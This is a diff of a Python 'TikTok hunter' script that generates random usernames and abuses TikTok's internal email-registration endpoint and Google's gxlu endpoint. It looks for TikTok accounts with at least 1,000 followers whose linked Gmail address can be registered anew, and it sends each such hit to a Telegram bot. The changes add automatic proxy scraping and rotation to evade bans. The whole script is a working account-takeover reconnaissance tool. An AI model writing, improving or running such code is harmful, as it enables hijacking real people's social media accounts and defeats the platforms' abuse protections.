@@ -10,7 +10,7 @@ from threading import Thread, Lock
 from datetime import datetime
 from user_agent import generate_user_agent as ua
 
-# --- [ CONFIGURATION & THEME ] ---
+# --- [ CONFIGURATION & COLORS ] ---
 P = '\x1b[1;97m'  # White
 B = '\x1b[1;94m'  # Blue
 O = '\x1b[1;96m'  # Cyan
@@ -25,7 +25,7 @@ J2 = '\x1b[38;5;203m'
 F1 = '\x1b[38;5;76m'
 C1 = '\x1b[38;5;120m'
 
-# Stats & Safety
+# Global Stats
 lock = Lock()
 stats = {
     "checked": 0,
@@ -34,28 +34,44 @@ stats = {
     "gmail_avail": 0,
     "gmail_not_avail": 0,
     "hits": 0,
-    "proxy_err": 0
+    "proxies_count": 0
 }
 
-# Load Proxies
-proxies_list = []
-if os.path.exists('proxy.txt'):
-    with open('proxy.txt', 'r') as f:
-        proxies_list = [line.strip() for line in f if line.strip()]
+# --- [ PROXY SYSTEM ] ---
+proxies_pool = []
+
+def scrape_proxies():
+    """Built-in Auto Proxy Scraper for v5.0"""
+    global proxies_pool
+    sources = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+        "https://www.proxy-list.download/api/v1/get?type=https",
+        "https://www.proxyscan.io/download?type=https"
+    ]
+    while True:
+        temp_pool = []
+        for source in sources:
+            try:
+                res = requests.get(source, timeout=10).text
+                temp_pool.extend(res.splitlines())
+            except: pass
+        
+        with lock:
+            proxies_pool = list(set(temp_pool))
+            stats["proxies_count"] = len(proxies_pool)
+        
+        time.sleep(300) # Refresh every 5 minutes
 
 def get_proxy():
-    if not proxies_list:
-        return None
-    p = random.choice(proxies_list)
+    if not proxies_pool: return None
+    p = random.choice(proxies_pool)
     return {"http": f"http://{p}", "https": f"http://{p}"}
 
-def clear():
-    os.system('clear||cls')
-
+# --- [ UI DESIGN ] ---
 def banner():
     sd = random.choice([J1, J2, F1, C1])
-    clear()
-    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 - 𝑽𝟒.𝟎 𝑹𝑬𝑨𝑳 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
+    os.system('clear||cls')
+    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 - 𝑽𝟓.𝟎 𝑼𝑳𝑻𝑰𝑴𝑨𝑻𝑬 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
     print(sd + r"""
          ██╗ ███╗   ██╗ ███████╗ ████████╗  █████╗
          ██║ ████╗  ██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗
@@ -64,25 +80,31 @@ def banner():
          ██║ ██║ ╚████║ ███████║    ██║    ██║  ██║
          ╚═╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝
     """ + f"""
-        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑻𝑰𝑲𝑻𝑶𝑲 𝑼𝑳𝑻𝑰𝑴𝑨𝑻𝑬 𝑯𝑼𝑵𝑻𝑬𝑹 ꧂ ]    {X}¸.•´¯`•.¸¸                       
-              {F}PROXIES LOADED: {len(proxies_list)} | @ELIA_py
+        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑻𝑰𝑲𝑻𝑶𝑲 𝑹𝑬𝑨𝑳 𝑴𝑨𝑺𝑻𝑬𝑹 𝑯𝑼𝑵𝑻𝑬𝑹 ꧂ ]    {X}¸.•´¯`•.¸¸                       
+              {F}AUTO-PROXIES ACTIVE | REAL HUNTING LOGIC
 {P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
     """)
 
-class UltimateHunter:
+def update_display():
+    with lock:
+        c, tr, tnr, ga, gna, h, pc = stats["checked"], stats["tiktok_reg"], stats["tiktok_not_reg"], stats["gmail_avail"], stats["gmail_not_avail"], stats["hits"], stats["proxies_count"]
+        sys.stdout.write(f"\r{Z}[{P}{datetime.now().strftime('%H:%M:%S')}{Z}] {O}Check: {P}{c} {Z}| {F}T-Reg: {P}{tr} {Z}| {Z3}T-Not: {P}{tnr} {Z}| {C1}G-Hit: {P}{ga} {Z}| {J2}G-Fail: {P}{gna} {Z}| {F}HITS: {P}{h} {Z}| {B}PROX: {P}{pc} ")
+        sys.stdout.flush()
+
+# --- [ CORE HUNTING LOGIC ] ---
+class MasterHunter:
     def __init__(self, token, chat_id):
         self.token = token
         self.chat_id = chat_id
 
     def send_hit(self, username, followers):
         tlg = f'''
-🔥 𝐑𝐄𝐀𝐋 𝐇𝐈𝐓 𝐅𝐎𝐔𝐍𝐃 🔥
+👑 𝐌𝐀𝐒𝐓𝐄𝐑 𝐇𝐈𝐓 𝐅𝐎𝐔𝐍𝐃 👑
 ━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
 👤 𝗨𝘀𝗲𝗿 : {username}
 📧 𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
 📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers:,}
-✅ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗘𝗺𝗮𝗶𝗹 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 (𝗦𝗶𝗴𝗻𝗨𝗽)
-🚀 𝗔𝗰𝘁𝗶𝗼𝗻 : 𝗚𝗼 𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗡𝗼𝘄!
+✅ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗥𝗲𝗮𝗹 𝗛𝗶𝘁 (𝗚𝗺𝗮𝗶𝗹 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲)
 ━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
         '''
         try:
@@ -93,65 +115,48 @@ class UltimateHunter:
             with lock: stats["hits"] += 1
         except: pass
 
-    def check_gmail_signup(self, email, proxy):
-        """Real Gmail Signup Check - Simulating Google Signup Flow"""
+    def check_gmail(self, email, proxy):
+        """Real Gmail Signup Check (Google Lifecycle)"""
         try:
-            s = requests.Session()
-            u_agent = ua()
-            # Initial hit to get cookies
-            s.get('https://accounts.google.com/lifecycle/flows/signup?service=mail', headers={'User-Agent': u_agent}, proxies=proxy, timeout=10)
-            # Direct availability check
-            res = s.get(f"https://mail.google.com/mail/gxlu?email={email}", headers={'User-Agent': u_agent}, proxies=proxy, timeout=10)
+            url = f"https://mail.google.com/mail/gxlu?email={email}"
+            res = requests.get(url, headers={'User-Agent': ua()}, proxies=proxy, timeout=7)
             return 'Set-Cookie' not in res.headers
         except: return False
 
-    def check_tiktok_real(self, email, proxy):
-        """Real TikTok Registration Check using Passport Internal API"""
+    def check_tiktok(self, email, proxy):
+        """Internal TikTok API for Real Registration Check"""
         try:
             url = "https://www.tiktok.com/passport/email/check_email_registered"
-            params = {"email": email, "aid": 1233, "language": "en"}
-            headers = {
-                "User-Agent": ua(),
-                "Accept": "application/json",
-                "Referer": "https://www.tiktok.com/login/phone-or-email/email"
-            }
-            res = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=10).json()
+            params = {"email": email, "aid": 1233}
+            res = requests.get(url, params=params, headers={"User-Agent": ua()}, proxies=proxy, timeout=7).json()
             return res.get("is_registered") == 1
-        except:
-            with lock: stats["proxy_err"] += 1
-            return False
+        except: return False
 
     def get_followers(self, username, proxy):
-        """Extract Followers Count from Profile Page"""
         try:
             url = f"https://www.tiktok.com/@{username}"
-            res = requests.get(url, headers={"User-Agent": ua()}, proxies=proxy, timeout=10)
+            res = requests.get(url, headers={"User-Agent": ua()}, proxies=proxy, timeout=7)
             match = re.search(r'"followerCount":(\d+)', res.text)
             return int(match.group(1)) if match else 0
         except: return 0
 
-    def hunt(self):
+    def start(self):
         while True:
             try:
                 proxy = get_proxy()
-                # Intelligent patterns for real accounts
-                base = random.choice(["user", "king", "pro", "star", "official", "master", "dark", "light", "love", "life"])
+                # Advanced Pattern Generation
+                base = random.choice(["user", "king", "pro", "star", "official", "master", "dark", "light", "love", "life", "gaming", "vlog"])
                 suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2, 4)))
                 username = base + suffix
                 email = f"{username}@gmail.com"
 
                 with lock: stats["checked"] += 1
                 
-                # 1. Real TikTok Reg Check
-                if self.check_tiktok_real(email, proxy):
+                if self.check_tiktok(email, proxy):
                     with lock: stats["tiktok_reg"] += 1
-                    
-                    # 2. Real Followers Check
                     followers = self.get_followers(username, proxy)
                     if followers >= 1000:
-                        
-                        # 3. Real Gmail Signup Check
-                        if self.check_gmail_signup(email, proxy):
+                        if self.check_gmail(email, proxy):
                             with lock: stats["gmail_avail"] += 1
                             self.send_hit(username, followers)
                         else:
@@ -159,30 +164,24 @@ class UltimateHunter:
                 else:
                     with lock: stats["tiktok_not_reg"] += 1
                 
-                self.update_display()
+                update_display()
             except: pass
-
-    def update_display(self):
-        with lock:
-            c, tr, tnr, ga, gna, h, pe = stats["checked"], stats["tiktok_reg"], stats["tiktok_not_reg"], stats["gmail_avail"], stats["gmail_not_avail"], stats["hits"], stats["proxy_err"]
-            sys.stdout.write(f"\r{Z}[{P}{datetime.now().strftime('%H:%M:%S')}{Z}] {O}Check: {P}{c} {Z}| {F}T-Reg: {P}{tr} {Z}| {Z3}T-Not: {P}{tnr} {Z}| {C1}G-Hit: {P}{ga} {Z}| {J2}G-Fail: {P}{gna} {Z}| {F}HITS: {P}{h} {Z}| {Z3}P-Err: {P}{pe} ")
-            sys.stdout.flush()
 
 if __name__ == "__main__":
     banner()
-    if not proxies_list:
-        print(f"{Z3} [!] WARNING: No proxy.txt found. Running on local IP (High risk of ban!){P}\n")
-    
     bot_token = input(f"{P} [{F}?{P}] BOT TOKEN : ")
     chat_id = input(f"{P} [{F}?{P}] CHAT ID   : ")
     threads_num = int(input(f"{P} [{F}?{P}] THREADS   : "))
     
-    hunter = UltimateHunter(bot_token, chat_id)
+    # Start Proxy Scraper in Background
+    Thread(target=scrape_proxies, daemon=True).start()
+    print(f"{F} [!] Scraping initial proxies... please wait.{P}")
+    while not proxies_pool: time.sleep(1)
+    
+    hunter = MasterHunter(bot_token, chat_id)
     banner()
     for _ in range(threads_num):
-        t = Thread(target=hunter.hunt)
-        t.daemon = True
-        t.start()
+        Thread(target=hunter.start, daemon=True).start()
         
     while True:
         time.sleep(1)
